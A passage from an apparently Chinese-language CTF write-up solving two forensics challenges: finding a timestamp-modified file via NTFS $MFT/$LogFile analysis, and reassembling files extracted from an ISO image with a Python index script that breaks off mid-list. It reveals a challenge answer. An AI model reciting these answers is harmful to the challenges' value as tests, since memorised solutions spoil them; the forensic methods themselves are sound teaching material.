<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wow, you have a great ability. How did you solve this? Are you a hacker? Please give me a lesson later.</span><br></pre></td></tr></table></figure>

<h3 id="EzTime"><a href="#EzTime" class="headerlink" title="EzTime"></a>EzTime</h3><blockquote>
<p>Forensic.Find a file that a time attribute has been modified by a program.</p>
</blockquote>
<p>解压两次得到附件 $MFT 和 ​$LogFile，使用 NTFS Log Tracker 分析文件导出 csv。</p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623552765505/57240b89d028fb27c1709e7879f6df2104a327c8.png" alt="image-20210613105244681"></p>
<p>筛选出修改时间大于访问时间的条目，可得 flag。</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">File&#x2F;Directory Name	Full Path	Create Time	Modified Time	MFT_Modified Time	Access Time</span><br><span class="line">$Quota	\$Extend\$Quota	2021&#x2F;5&#x2F;23 0:25	2021&#x2F;5&#x2F;23 0:25	2021&#x2F;5&#x2F;23 0:25	2021&#x2F;5&#x2F;23 0:25</span><br><span class="line">daniel-olah-HNkgPFBShSw-unsplash.jpg	\daniel-olah-HNkgPFBShSw-unsplash.jpg	2021&#x2F;5&#x2F;23 0:25	2021&#x2F;5&#x2F;23 0:25	2021&#x2F;5&#x2F;23 0:27	2021&#x2F;5&#x2F;23 0:25</span><br><span class="line">louis-reed-hzp_aT02R48-unsplash.jpg	\louis-reed-hzp_aT02R48-unsplash.jpg	2021&#x2F;5&#x2F;23 0:26	2021&#x2F;5&#x2F;23 0:26	2021&#x2F;5&#x2F;23 0:27	2021&#x2F;5&#x2F;23 0:26</span><br><span class="line">&#123;45EF6FFC-F0B6-4000-A7C0-8D1549355A8C&#125;.png	\&#123;45EF6FFC-F0B6-4000-A7C0-8D1549355A8C&#125;.png	2021&#x2F;5&#x2F;23 0:28	2021&#x2F;5&#x2F;19 23:59	2021&#x2F;5&#x2F;23 0:32	2021&#x2F;5&#x2F;23 0:28</span><br><span class="line">BlackboardFieldPillBackground.png	\fr_MA\BlackboardFieldPillBackground.png	2021&#x2F;5&#x2F;23 0:28	2018&#x2F;2&#x2F;20 17:24	2021&#x2F;5&#x2F;23 0:33	2021&#x2F;5&#x2F;23 0:28</span><br><span class="line">editmode-run-test.png	\fr_MA\editmode-run-test.png	2021&#x2F;5&#x2F;23 0:28	2020&#x2F;8&#x2F;5 13:38	2021&#x2F;5&#x2F;23 0:33	2021&#x2F;5&#x2F;23 0:28</span><br><span class="line">IMG_2279.JPG	\fr_MA\IMG_2279.JPG	2021&#x2F;5&#x2F;23 0:29	2020&#x2F;10&#x2F;19 23:51	2021&#x2F;5&#x2F;23 0:33	2021&#x2F;5&#x2F;23 0:29</span><br><span class="line">IMG_2281.JPG	\fr_MA\IMG_2281.JPG	2021&#x2F;5&#x2F;23 0:29	2020&#x2F;10&#x2F;19 23:50	2021&#x2F;5&#x2F;23 0:33	2021&#x2F;5&#x2F;23 0:29</span><br><span class="line">&#123;0A2792E2-9495-4DF8-93F5-581086B905B6&#125;.png	\en_US\&#123;0A2792E2-9495-4DF8-93F5-581086B905B6&#125;.png	2021&#x2F;5&#x2F;23 0:28	2021&#x2F;5&#x2F;19 20:54	2021&#x2F;5&#x2F;23 0:33	2021&#x2F;5&#x2F;23 0:28</span><br><span class="line">&#123;0AC4E564-51D1-41CF-BA81-DA2629CBB93B&#125;.png	\en_GB\&#123;0AC4E564-51D1-41CF-BA81-DA2629CBB93B&#125;.png	2021&#x2F;5&#x2F;23 0:28	2021&#x2F;5&#x2F;22 21:38	2021&#x2F;5&#x2F;23 0:33	2021&#x2F;5&#x2F;23 0:28</span><br><span class="line">&#123;0A8E35BF-7598-4676-9882-D7E157D5034C&#125;.png	\es_NA\&#123;0A8E35BF-7598-4676-9882-D7E157D5034C&#125;.png	2021&#x2F;5&#x2F;23 0:28	2021&#x2F;5&#x2F;19 20:54	2021&#x2F;5&#x2F;23 0:33	2021&#x2F;5&#x2F;23 0:28</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;45EF6FFC-F0B6-4000-A7C0-8D1549355A8C&#125;.png</span><br></pre></td></tr></table></figure>

<h3 id="ISO1995"><a href="#ISO1995" class="headerlink" title="ISO1995"></a>ISO1995</h3><blockquote>
<p>We follow ISO1995. ISO1995 has many problems though. One known problem is a time.</p>
</blockquote>
<p>将附件提取出来， file 一次可以得到如下信息。</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iso1995: ISO 9660 CD-ROM filesystem data &#39;Debian 10.6.0 AMD64 Network&#39;</span><br></pre></td></tr></table></figure>

<p>使用 UltraISO 加载磁盘，将其中的文件提取出来。</p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623555716068/3f048fcd5acf1da7e59bc548f9db86bcb1080e9f.png"></p>
<p>使用 010 Editor 打开文件可以发现明显顺序，将 <code>FF FF FF FF</code> 后面的两字节提取出来拼接成一个十六进制数字。</p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623563522098/55f594d43ad02f6a55a4551bf4718b0be3185cf8.png"></p>
<p>写一个脚本按照顺序去访问并拼接文件。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">indexes = [<span class="number">0x000</span>,<span class="number">0x00AA</span>,<span class="number">0x0357</span>,<span class="number">0x02C5</span>,<span class="number">0x0023</span>,<span class="number">0x0268</span>,<span class="number">0x02F2</span>,<span class="number">0x02DB</span>,<span class="number">0x03E5</span>,<span class="number">0x01E5</span>,<span class="number">0x0101</span>,<span class="number">0x02A8</span>,<span class="number">0x0236</span>,<span class="number">0x0267</span>,<span class="number">0x03F2</span>,<span class="number">0x009E</span>,<span class="number">0x002A</span>,<span class="number">0x00E0</span>,<span class="number">0x0398</span>,<span class="number">0x01B0</span>,<span class="number">0x028A</span>,<span class="number">0x006D</span>,<span class="number">0x03D1</span>,<span class="number">0x019D</span>,<span class="number">0x01CB</span>,<span class="number">0x031B</span>,<span class="number">0x0319</span>,<span class="number">0x02A0</span>,<span class="number">0x0259</span>,<span class="number">0x00A1</span>,<span class="number">0x022D</span>,<span class="number">0x0305</span>,<span class="number">0x0051</span>,<span class="number">0x0231</span>,<span class="number">0x003C</span>,<span class="number">0x02C7</span>,<span class="number">0x02E3</span>,<span class="number">0x0199</span>,<span class="number">0x0235</span>,<span class="number">0x037E</span>,<span class="number">0x0185</span>,<span class="number">0x012E</span>,<span class="number">0x0074</span>,<span class="number">0x00A2</span>,<span class="number">0x006C</span>,<span class="number">0x0216</span>,<span class="number">0x02FC</span>,<span class="number">0x01B4</span>,<span class="number">0x01AA</span>,<span class="number">0x0269</span>,<span class="number">0x02CE</span>,<span class="number">0x00FD</span>,<span class="number">0x00B6</span>,<span class="number">0x01D3</span>,<span class="number">0x0049</span>,<span class="number">0x03BC</span>,<span class="number">0x02F0</span>,<span class="number">0x00F2</span>,<span class="number">0x0165</span>,<span class="number">0x03A4</span>,<span class="number">0x0325</span>,<span class="number">0x01EE</span>,<span class="number">0x03B4</span>,<span class="number">0x03DE</span>,<span class="number">0x02DE</span>,<span class="number">0x03F8</span>,<span class="number">0x0147</span>,<span class="number">0x024F</span>,<span class="number">0x033C</span>,<span class="number">0x0263</span>,<span class="number">0x001C</span>,<span class="number">0x03F4</span>,<span class="number">0x0097</span>,<span class="number">0x02EC</span>,<span class="number">0x0091</span>,<span class="number">0x000C</span>,<span class="number">0x00BF</span>,<span class="number">0x0168</span>,<span class="number">0x0233</span>,<span class="number">0x01A4</span>,<span class="number">0x038C</span>,<span class="number">0x024E</span>,<span class="number">0x024D</span>,<span class="number">0x03C5</span>,<span class="number">0x0086</span>,<span class="number">0x037C</span>,<span class="number">0x0012</span>,<span class="number">0x02C1</span>,<span class="number">0x0111</span>,<span class="number">0x0126</span>,<span class="number">0x0368</span>,<span class="number">0x01C7</span>,<span class="number">0x0007</span>,<span class="number">0x02F3</span>,<span class="number">0x0070</span>,<span class="number">0x00BB</span>,<span class="number">0x0304</span>,<span class="number">0x036B</span>,<span class="number">0x02D3</span>,<span class="number">0x0041</span>,<span class="number">0x03AF</span>,<span class="number">0x0130</span>,<span class="number">0x017C</span>,<span class="number">0x0034</span>,<span class="number">0x0397</span>,<span class="number">0x0061</span>,<span class="number">0x0081</span>,<span class="number">0x02A3</span>,<span class="number">0x01A8</span>,<span class="number">0x0092</span>,<span class="number">0x012A</span>,<span class="number">0x002C</span>,<span class="number">0x0135</span>,<span class="number">0x0323</span>,<span class="number">0x028E</span>,<span class="number">0x00F9</span>,<span class="number">0x02D7</span>,<span class="number">0x0109</span>,<span class="number">0x01A7</span>,<span class="number">0x02F8</span>,<span class="number">0x0327</span>,<span class="number">0x01EF</span>,<span class="number">0x000F</span>,<span class="number">0x03C8</span>,<span class="number">0x020E</span>,<span class="number">0x014A</span>,<span class="number">0x0260</span>,<span class="number">0x0344</span>,<span class="number">0x0343</span>,<span class="number">0x00C4</span>,<span class="number">0x022C</span>,<span class="number">0x0099</span>,<span class="number">0x026D</span>,<span class="number">0x008A</span>,<span class="number">0x0301</span>,<span class="number">0x03F1</span>,<span class="number">0x0273</span>,<span class="number">0x031F</span>,<span class="number">0x009D</span>,<span class="number">0x00F5</span>,<span class="number">0x01FA</span>,<span class="number">0x010D</span>,<span class="number">0x037A</span>,<span class="number">0x0361</span>,<span class="number">0x01E1</span>,<span class="number">0x0307</span>,<span class="number">0x0215</span>,<span class="number">0x02E2</span>,<span class="number">0x01B7</span>,<span class="number">0x0225</span>,<span class="number">0x0310</span>,<span class="number">0x0035</span>,<span class="number">0x0243</span>,<span class="number">0x0286</span>,<span class="number">0x02D8</span>,<span class="number">0x0108</span>,<span class="number">0x03EF</span>,<span class="number">0x01F5</span>,<span class="number">0x030A</span>,<span class="number">0x0339</span>,<span class="number">0x0170</span>,<span class="number">0x0107</span>,<span class="number">0x0177</span>,<span class="number">0x0100</span>,<span class="number">0x005C</span>,<span class="number">0x021C</span>,<span class="number">0x0169</span>,<span class="number">0x0063</span>,<span class="number">0x0102</span>,<span class="number">0x03E1</span>,<span class="number">0x039C</span>,<span class="number">0x00DA</span>,<span class="number">0x037D</span>,<span class="number">0x01BC</span>,<span class="number">0x0140</span>,<span class="number">0x02A5</span>,<span class="number">0x0349</span>,<span class="number">0x00D8</span>,<span class="number">0x033A</span>,<span class="number">0x00C1</span>,<span class="number">0x0044</span>,<span class="number">0x03CF</span>,<span class="number">0x0291</span>,<span class="number">0x01FF</span>,<span class="number">0x03D8</span>,<span class="number">0x0239</span>,<span class="number">0x0338</span>,<span class="number">0x030B</span>,<span class="number">0x0106</span>,<span class="number">0x02B3</span>,<span class="number">0x03FB</span>,<span class="number">0x03F0</span>,<span class="number">0x0077</span>,<span class="number">0x01CD</span>,<span class="number">0x0256</span>,<span class="number">0x00EC</span>,<span class="number">0x004C</span>,<span class="number">0x03EB</span>,<span class="number">0x0001</span>,<span class="number">0x0162</span>,<span class="number">0x0266</span>,<span class="number">0x035B</span>,<span class="number">0x0298</span>,<span class="number">0x000A</span>,<span class="number">0x02CC</span>,<span class="number">0x0248</span>,<span class="number">0x0115</span>,<span class="number">0x00A8</span>,<span class="number">0x034D</span>,<span class="number">0x0254</span>,<span class="number">0x01D7</span>,<span class="number">0x03E9</span>,<span class="number">0x035A</span>,<span class="number">0x0227</span>,<span class="number">0x0065</span>,<span class="number">0x016B</span>,<span class="number">0x03AC</span>,<span class="number">0x0383</span>,<span class="number">0x0039</span>,<span class="number">0x0195</span>,<span class="number">0x03EA</span>,<span class="number">0x030D</span>,<span class="number">0x03AE</span>,<span class="number">0x0282</span>,<span class="number">0x0078</span>,<span class="number">0x0015</span>,<span class="number">0x01B8</span>,<span class="number">0x011D</span>,<span class="number">0x0186</span>,<span class="number">0x00F6</span>,<span class="number">0x0018</span>,<span class="number">0x0148</span>,<span class="number">0x038E</span>,<span class="number">0x00F4</span>,<span class="number">0x0137</span>,<span class="number">0x01F0</span>,<span class="number">0x0122</span>,<span class="number">0x03CD</span>,<span class="number">0x011E</span>,<span class="number">0x0272</span>,<span class="number">0x01CE</span>,<span class="number">0x01F1</span>,<span class="number">0x03B8</span>,<span class="number">0x022B</span>,<span class="number">0x02AE</span>,<span class="number">0x00BE</span>,<span class="number">0x0385</span>,<span class="number">0x0133</span>,<span class="number">0x033E</span>,<span class="number">0x020C</span>,<span class="number">0x0210</span>,<span class="number">0x03A9</span>,<span class="number">0x01BD</span>,<span class="number">0x00ED</span>,<span class="number">0x0334</span>,<span class="number">0x0330</span>,<span class="number">0x0214</span>,<span class="number">0x008F</span>,<span class="number">0x014B</span>,<span class="number">0x00D7</span>,<span class="number">0x0004</span>,<span class="number">0x0265</span>,<span class="number">0x0143</span>,<span class="number">0x01A9</span>,<span class="number">0x0180</span>,<span class="number">0x0178</span>,<span class="number">0x034C</span>,<span class="number">0x0062</span>,<span class="number">0x0302</span>,<span class="number">0x01BE</span>,<span class="number">0x02F5</span>,<span class="number">0x0366</span>,<span class="number">0x00AD</span>,<span class="number">0x02AD</span>,<span class="number">0x0164</span>,<span class="number">0x0333</span>,<span class="number">0x0142</span>,<span class="number">0x036E</span>,<span class="number">0x03E0</span>,<span class="number">0x0345</span>,<span class="number">0x018A</span>,<span class="number">0x00E3</span>,<span class="number">0x00A3</span>,<span class="number">0x00FB</span>,<span class="number">0x028F</span>,<span class="number">0x03BF</span>,<span class="number">0x022F</span>,<span class="number">0x02DC</span>,<span class="number">0x039E</span>,<span class="number">0x03D9</span>,<span class="number">0x0314</span>,<span class="number">0x0068</span>,<span class="number">0x03B6</span>,<span class="number">0x00A6</span>,<span class="number">0x02D2</span>,<span class="number">0x0222</span>,<span class="number">0x0103</span>,<span class="number">0x004D</span>,<span class="number">0x03F9</span>,<span class="number">0x008B</span>,<span class="number">0x01F6</span>,<span class="number">0x018E</span>,<span class="number">0x03E3</span>,<span class="number">0x0300</span>,<span class="number">0x00C0</span>,<span class="number">0x02AA</span>,<span class="number">0x01A1</span>,<span class="number">0x0139</span>,<span class="number">0x019F</span>,<span class="number">0x0360</span>,<span class="number">0x025B</span>,<span class="number">0x01BA</span>,<span class="number">0x0276</span>,<span class="number">0x00F0</span>,<span class="number">0x038D</span>,<span class="number">0x001F</span>,<span class="number">0x0006</span>,<span class="number">0x028C</span>,<span class="number">0x0132</span>,<span class="number">0x03D6</span>,<span class="number">0x020B</span>,<span class="number">0x0198</span>,<span class="number">0x0188</span>,<span class="number">0x02A1</span>,<span class="number">0x0238</span>,<span class="number">0x01E6</span>,<span class="number">0x007C</span>,<span class="number">0x035D</span>,<span class="number">0x0064</span>,<span class="number">0x009F</span>,<span class="number">0x024A</span>,<span class="number">0x00D0</span>,<span class="number">0x01BB</span>,<span class="number">0x005E</span>,<span class="number">0x02BD</span>,<span class="number">0x019A</span>,<span class="number">0x0193</span>,<span class="number">0x00F8</span>,<span class="number">0x03A3</span>,<span class="number">0x0362</span>,<span class="number">0x019E</span>,<span class="number">0x00D4</span>,<span class="number">0x026E</span>,<span class="number">0x03EE</span>,<span class="number">0x0352</span>,<span class="number">0x015F</span>,<span class="number">0x0232</span>,<span class="number">0x01FB</span>,<span class="number">0x03C0</span>,<span class="number">0x02BA</span>,<span class="number">0x03BE</span>,<span class="number">0x02EB</span>,<span class="number">0x01C1</span>,<span class="number">0x0390</span>,<span class="number">0x0129</span>,<span class="number">0x0399</span>,<span class="number">0x00CC</span>,<span class="number">0x02AC</span>,<span class="number">0x02BB</span>,<span class="number">0x02A9</span>,<span class="number">0x0038</span>,<span class="number">0x00E4</span>,<span class="number">0x00E1</span>,<span class="number">0x009C</span>,<span class="number">0x020A</span>,<span class="number">0x0320</span>,<span class="number">0x0396</span>,<span class="number">0x0207</span>,<span class="number">0x01F9</span>,<span class="number">0x0192</span>,<span class="number">0x034E</span>,<span class="number">0x02B5</span>,<span class="number">0x01F8</span>,<span class="number">0x0328</span>,<span class="number">0x03CB</span>,<span class="number">0x0242</span>,<span class="number">0x00B7</span>,<span class="number">0x0381</span>,<span class="number">0x00B8</span>,<span class="number">0x03E7</span>,<span class="number">0x012F</span>,<span class="number">0x019C</span>,<span class="number">0x031C</span>,<span class="number">0x03F5</span>,<span class="number">0x0230</span>,<span class="number">0x023C</span>,<span class="number">0x0113</span>,<span class="number">0x006F</span>,<span class="number">0x00AE</span>,<span class="number">0x01DE</span>,<span class="number">0x0071</span>,<span class="number">0x0296</span>,<span class="number">0x01F7</span>,<span class="number">0x02A2</span>,<span class="number">0x004A</span>,<span class="number">0x0128</span>,<span class="number">0x0110</span>,<span class="number">0x005F</span>,<span class="number">0x0247</span>,<span class="number">0x01C4</span>,<span class="number">0x034B</span>,<span 